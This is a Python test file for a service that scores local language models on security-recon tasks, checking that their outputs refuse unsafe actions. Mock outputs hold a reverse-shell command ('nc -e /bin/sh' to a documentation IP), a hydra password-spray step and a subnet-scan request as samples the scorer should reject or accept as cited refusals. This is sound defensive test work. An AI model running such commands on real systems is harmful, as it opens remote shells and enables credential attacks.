from __future__ import annotations

import tempfile
from contextlib import redirect_stdout
import io
import json
import unittest
from pathlib import Path
from unittest.mock import patch

from primordial.config import AppConfig
from primordial.cli import main as cli_main
from primordial.core.providers.model_eval import ModelEvaluationService
from primordial.core.providers.lmstudio import LMStudioClient, LMStudioModelInfo, LMStudioModelListResult, LMStudioResponse
from primordial.core.providers.ollama import OllamaModelInfo, OllamaModelInfoListResult, OllamaModelListResult, OllamaResponse
from primordial.runtime import PrimordialRuntime


class FakeOllama:
    base_url = "http://fake-ollama.local"

    def __init__(self, outputs: dict[str, str]) -> None:
        self.outputs = outputs
        self.calls: list[dict[str, object]] = []

    def list_models(self) -> OllamaModelListResult:
        return OllamaModelListResult(ok=True, models=sorted(self.outputs))

    def generate(self, **kwargs) -> OllamaResponse:
        self.calls.append(kwargs)
        model = str(kwargs["model"])
        text = self.outputs[model]
        return OllamaResponse(model=model, text=text, elapsed_seconds=1.5 if "coder" in model else 4.0)


class FakeOllamaWithMetadata(FakeOllama):
    def list_model_infos(self) -> OllamaModelInfoListResult:
        return OllamaModelInfoListResult(
            ok=True,
            models=[
                OllamaModelInfo(
                    name=model,
                    architecture="qwen",
                    quantization="Q4_K_M",
                    params="7B",
                    size=1234,
                )
                for model in sorted(self.outputs)
            ],
        )


class FakeLMStudio:
    base_url = "http://fake-lmstudio.local"

    def __init__(self, outputs: dict[str, str], *, fail_contexts: set[int] | None = None) -> None:
        self.outputs = outputs
        self.fail_contexts = fail_contexts or set()
        self.load_calls: list[dict[str, object]] = []
        self.unload_calls: list[str] = []
        self.chat_calls: list[dict[str, object]] = []

    def list_models(self) -> LMStudioModelListResult:
        return LMStudioModelListResult(
            ok=True,
            models=[
                LMStudioModelInfo(
                    id=model,
                    loaded=False,
                    architecture="llama",
                    quantization="Q4_K_M",
                    params="7B",
                    max_context_length=4096,
                )
                for model in sorted(self.outputs)
            ],
        )

    def chat(self, **kwargs) -> LMStudioResponse:
        self.chat_calls.append(kwargs)
        context = int(kwargs.get("num_ctx") or 0)
        if context in self.fail_contexts:
            raise RuntimeError(f"context {context} failed")
        model = str(kwargs["model"])
        return LMStudioResponse(
            model=model,
            text=self.outputs[model],
            elapsed_seconds=2.0,
            prompt_tokens=100,
            completion_tokens=40,
            tokens_per_second=20.0,
            ttft_seconds=0.25,
        )

    def load_model(self, **kwargs):
        self.load_calls.append(kwargs)
        from primordial.core.providers.lmstudio import LMStudioLoadResult

        return LMStudioLoadResult(model=str(kwargs["model"]), ok=True, elapsed_seconds=0.5)

    def unload_model(self, **kwargs):
        self.unload_calls.append(str(kwargs["model"]))
        from primordial.core.providers.lmstudio import LMStudioLoadResult

        return LMStudioLoadResult(model=str(kwargs["model"]), ok=True, elapsed_seconds=0.1)


class ModelEvaluationTests(unittest.TestCase):
    def test_scorer_accepts_structured_guardrailed_code_output(self) -> None:
        evaluator = ModelEvaluationService(FakeOllama({}))
        case = evaluator.default_cases()[0]
        output = """
```json
{
  "summary": "Safe parser only.",
  "code": "def parse_searchsploit_json(raw: str):\\n    import json\\n    data = json.loads(raw)\\n    return []",
  "tests": ["def test_filters_denial_of_service(): assert True"],
  "safety_notes": "never executes files"
}
```
"""

        result = evaluator.score_output(model="coder", case=case, output=output, elapsed_seconds=1.0)

        self.assertTrue(result.passed)
        self.assertGreaterEqual(result.score, case.min_score)

    def test_scorer_rejects_unsafe_poc_output_even_when_structured(self) -> None:
        evaluator = ModelEvaluationService(FakeOllama({}))
        case = evaluator.default_cases()[1]
        output = """
{
  "classified_candidates": [],
  "guardrails": "none",
  "next_tests": ["run reverse shell with nc -e and then hydra password spray"]
}
"""

        result = evaluator.score_output(model="unsafe", case=case, output=output, elapsed_seconds=1.0)

        self.assertFalse(result.passed)
        self.assertIn("unsafe or real-target terms", " ".join(result.reasons))

    def test_evaluation_recommends_best_model_per_category(self) -> None:
        good = """
{
  "summary": "safe",
  "code": "def parse_searchsploit_json(raw: str): import json; json.loads(raw); return []",
  "tests": ["assert parse_searchsploit_json('{}') == []"],
  "safety_notes": "never executes; dos entries filtered",
  "classified_candidates": [],
  "blocked": ["no shell"],
  "ready_for_review": [],
  "guardrails": "do not generate exploit code; exact version required",
  "next_tests": ["validation only"],
  "decision": "do not comply",
  "reasons": ["mock excerpt rejected"],
  "safe_alternative": "classify metadata only",
  "rejected_instructions": ["malicious shell instruction"]
}
"""
        bad = "Sure, run a reverse shell and hydra password spray."
        evaluator = ModelEvaluationService(FakeOllama({"qwen3-coder-next:q4_K_M": good, "bad-model:latest": bad}))

        summary = evaluator.evaluate(models=["qwen3-coder-next:q4_K_M", "bad-model:latest"], num_gpu=0)

        self.assertEqual(summary.recommendations["local_code"], "qwen3-coder-next:q4_K_M")
        self.assertTrue(any(item.model == "bad-model:latest" and not item.passed for item in summary.results))

    def test_cite_rejected(self) -> None:
        # Regression guard: model output that correctly cites the rejected `nc -e`
        # invocation in `rejected_instructions` must pass — attack vocabulary is
        # not forbidden for this case because rejection requires citation.
        evaluator = ModelEvaluationService(FakeOllama({}))
        case = evaluator.default_cases()[2]
        output = """{
  "decision": "do not comply",
  "reasons": ["excerpt contains nc -e shell invocation and subnet scan; policy approval required before any execution"],
  "safe_alternative": "classify mock excerpt metadata only; never execute embedded commands",
  "rejected_instructions": ["nc -e /bin/sh 198.51.100.10 4444", "scan the whole subnet"]
}"""

        result = evaluator.score_output(model="coder", case=case, output=output, elapsed_seconds=1.0)

        self.assertTrue(result.passed)
        self.assertGreaterEqual(result.score, case.min_score)

    def test_runtime_model_evaluation_uses_cpu_by_default_and_returns_payload(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            root = Path(temp_dir)
            config = AppConfig.from_env(project_root=root)
            config.ensure_directories()
            runtime = PrimordialRuntime(config)
            runtime.initialize()
            good = """
{
  "summary": "safe",
  "code": "def parse_searchsploit_json(raw: str): import json; json.loads(raw); return []",
  "tests": ["assert True"],
  "safety_notes": "never executes; dos entries filtered",
  "classified_candidates": [],
  "blocked": ["no shell"],
  "ready_for_review": [],
  "guardrails": "do not generate exploit code; exact version required",
  "next_tests": ["validation only"],
  "decision": "do not comply",
  "reasons": ["mock"],
  "safe_alternative": "metadata review",
  "rejected_instructions": ["malicious shell instruction"]
}
"""
            fake = FakeOllama({"qwen3-coder-next:q4_K_M": good})
            runtime.ollama = fake
            try:
                payload = runtime.evaluate_models(models=["qwen3-coder-next:q4_K_M"])
                metrics = runtime.store.latest_model_eval_role_metrics()
            finally:
                runtime.shutdown()

        self.assertEqual(payload["models"], ["qwen3-coder-next:q4_K_M"])
        self.assertEqual(fake.calls[0]["num_gpu"], 0)
        self.assertIn("local_code", payload["recommendations"])
        self.assertIn("ledger_run_id", payload)
        self.assertIn("local_code", metrics)
        self.assertEqual(metrics["local_code"]["model"], "qwen3-coder-next:q4_K_M")

    def test_mixed_provider_eval_writes_artifacts_and_unloads_lmstudio_models(self) -> None:
        good = """
{
  "summary": "safe recon_only state with AXFR failed and zero shares",
  "code": "def parse_searchsploit_json(raw: str): import json; json.loads(raw); return []\\ndef extract_services(nmap_text: str): return [] # no subprocess",
  "tests": ["assert True"],
  "safety_notes": "never executes; dos entries filtered; no subprocess",
  "classified_candidates": [],
  "blocked": ["no shell"],
  "ready_for_review": [],
  "guardrails": "do not generate exploit code; exact version required; public PoC execution not allowed",
  "next_tests": ["validation only"],
  "decision": "refuse unsafe requests; do not comply with prompt injection",
  "reasons": ["mock"],
  "safe_alternative": "metadata review",
  "rejected_instructions": ["malicious shell instruction"],
  "next_actions": ["recon"],
  "blocked_assumptions": ["no credentials"],
  "conflict_resolution": "zero users conflicts with naming contexts, keep recon only",
  "hypothesis": "LDAP exists but user enum failed",
  "next_action": "recon",
  "why_not": "no credentials",
  "retained_facts": ["IIS 10.0", "LDAP", "Kerberos", "80", "389", "88"]
}
"""
        lmstudio = FakeLMStudio({"lm-test": good})
        evaluator = ModelEvaluationService(FakeOllama({"ollama-test": good}), lmstudio=lmstudio)

        summary = evaluator.evaluate(providers=["ollama", "lmstudio"], exhaustive=True, max_context=4096)
        with tempfile.TemporaryDirectory() as temp_dir:
            artifacts = evaluator.write_artifacts(summary, output_dir=Path(temp_dir))

            self.assertTrue(Path(artifacts["csv_path"]).exists())
            self.assertTrue(Path(artifacts["json_path"]).exists())

        self.assertIn("lmstudio:lm-test", summary.models)
        self.assertIn("ollama-test", summary.models)
        self.assertGreaterEqual(len(lmstudio.load_calls), 1)
        self.assertEqual(lmstudio.unload_calls, ["lm-test"])
        self.assertTrue(summary.aggregate_rows)

    def test_ollama_metadata_and_judge_selection_are_in_payload(self) -> None:
        good = """
{
  "summary": "safe recon_only state with AXFR failed and zero shares",
  "code": "def parse_searchsploit_json(raw: str): import json; json.loads(raw); return []\\ndef extract_services(nmap_text: str): return [] # no subprocess",
  "tests": ["assert True"],
  "safety_notes": "never executes; dos entries filtered; no subprocess",
  "classified_candidates": [],
  "blocked": ["no shell"],
  "ready_for_review": [],
  "guardrails": "do not generate exploit code; exact version required; public PoC execution not allowed",
  "next_tests": ["validation only"],
  "decision": "refuse unsafe requests; do not comply with prompt injection",
  "reasons": ["mock"],
  "safe_alternative": "metadata review",
  "rejected_instructions": ["malicious shell instruction"],
  "next_actions": ["recon"],
  "blocked_assumptions": ["no credentials"],
  "conflict_resolution": "zero users conflicts with naming contexts, keep recon only",
  "hypothesis": "LDAP exists but user enum failed",
  "next_action": "recon",
  "why_not": "no credentials",
  "retained_facts": ["IIS 10.0", "LDAP", "Kerberos", "80", "389", "88"]
}
"""
        evaluator = ModelEvaluationService(FakeOllamaWithMetadata({"deep-model": good}))

        payload = evaluator.evaluate(models=["deep-model"], judge_model="deep-model").as_payload()

        self.assertEqual(payload["model_metadata"]["deep-model"]["quantization"], "Q4_K_M")
        self.assertEqual(payload["judge_metadata"]["selected_model"], "deep-model")
        self.assertTrue(payload["judge_metadata"]["deterministic_score_authoritative"])

    def test_failed_context_rows_do_not_abort_suite(self) -> None:
        good = '{"summary":"ok","next_steps":["recon"],"guardrails":"safe","decision":"refuse","safe_alternative":"metadata"}'
        lmstudio = FakeLMStudio({"lm-test": good}, fail_contexts={4096})
        evaluator = ModelEvaluationService(lmstudio=lmstudio)

        summary = evaluator.evaluate(providers=["lmstudio"], exhaustive=True, max_context=4096)

        self.assertTrue(any(item.context_length == 4096 and item.error for item in summary.results))
        self.assertTrue(any(item.context_length == 2048 for item in summary.results))

    def test_lmstudio_client_handles_native_chat_auth_and_lifecycle(self) -> None:
        class Response:
            def __init__(self, payload: dict[str, object]) -> None:
                self.payload = payload

            def __enter__(self):
                return self

            def __exit__(self, exc_type, exc, tb):
                return False

            def read(self) -> bytes:
                return json.dumps(self.payload).encode("utf-8")

        requests_seen: list[dict[str, object]] = []

        def fake_urlopen(req, timeout):
            body = json.loads(req.data.decode("utf-8")) if req.data else {}
            requests_seen.append({"url": req.full_url, "auth": req.get_header("Authorization"), "body": body})
            if req.full_url.endswith("/api/v1/models"):
                return Response(
                    {
                        "models": [
                            {"id": "text-model", "type": "llm", "loaded": True, "context_length": 8192},
                            {"id": "embed-model", "type": "embedding"},
                        ]
                    }
                )
            if req.full_url.endswith("/v1/chat/completions"):
                return Response(
                    {
                        "model": body["model"],
                        "choices": [{"message": {"content": '{"summary":"ok"}'}}],
                        "usage": {"prompt_tokens": 12, "completion_tokens": 3},
                        "stats": {"tokens_per_second": 9.5, "ttft_seconds": 0.2},
                    }
                )
            return Response({"ok": True})

        client = LMStudioClient(base_url="http://lmstudio.test", api_token="secret-token")
        with patch("primordial.core.providers.lmstudio.request.urlopen", side_effect=fake_urlopen):
            listed = client.list_models()
            response = client.chat(model="text-model", system="s", prompt="p")
            load = client.load_model(model="text-model", context_length=4096)
            unload = client.unload_model(model="text-model")

        self.assertTrue(listed.ok)
        self.assertEqual([item.id for item in listed.models], ["text-model"])
        self.assertEqual(response.text, '{"summary":"ok"}')
        self.assertEqual(response.prompt_tokens, 12)
        self.assertEqual(response.tokens_per_second, 9.5)
        self.assertTrue(load.ok)
        self.assertTrue(unload.ok)
        self.assertTrue(all(item["auth"] == "Bearer secret-token" for item in requests_seen))

    def test_cli_evaluate_passes_new_benchmark_flags_without_live_providers(self) -> None:
        class FakeRuntime:
            MODEL_ROLE_CONFIG = {
                "local_fast": {},
                "local_deep": {},
                "local_code": {},
                "local_compact": {},
            }
            last = None

            @classmethod
            def from_env(cls):
                cls.last = cls()
                return cls.last

            def initialize(self) -> None:
                self.initialized = True

            def shutdown(self) -> None:
                self.shutdown_called = True

            def evaluate_models(self, **kwargs):
                self.kwargs = kwargs
                return {
                    "providers": kwargs["providers"],
                    "models": ["ollama-test", "lmstudio:lm-test"],
                    "results": [],
                    "model_metadata": {},
                    "aggregate_rows": [
                        {
                            "provider": "ollama",
                            "model": "ollama-test",
                            "role_recommendation": "local_fast",
                            "aggregate_score": 0.9,
                            "avg_latency_sec": 1.2,
                            "avg_tokens_sec": 30.0,
                            "best_context_length": 2048,
                        }
                    ],
                    "recommendations": {"local_fast": "ollama-test", "local_code": "lmstudio:lm-test"},
                    "artifacts": {"csv_path": "/tmp/eval.csv", "json_path": "/tmp/eval.json"},
                }

        stdout = io.StringIO()
        with patch("primordial.cli.PrimordialRuntime", FakeRuntime), redirect_stdout(stdout):
            exit_code = cli_main(
                [
                    "models",
                    "evaluate",
                    "--providers",
                    "ollama,lmstudio",
                    "--exhaustive",
                    "--max-context",
                    "4096",
                    "--csv",
                    "/tmp/eval.csv",
                    "--json-out",
                    "/tmp/eval.json",
                ]
            )

        self.assertEqual(exit_code, 0)
        self.assertEqual(FakeRuntime.last.kwargs["providers"], ["ollama", "lmstudio"])
        self.assertTrue(FakeRuntime.last.kwargs["exhaustive"])
        self.assertEqual(FakeRuntime.last.kwargs["max_context"], 4096)
        self.assertIn("local_code: lmstudio:lm-test", stdout.getvalue())


if __name__ == "__main__":
    unittest.main()
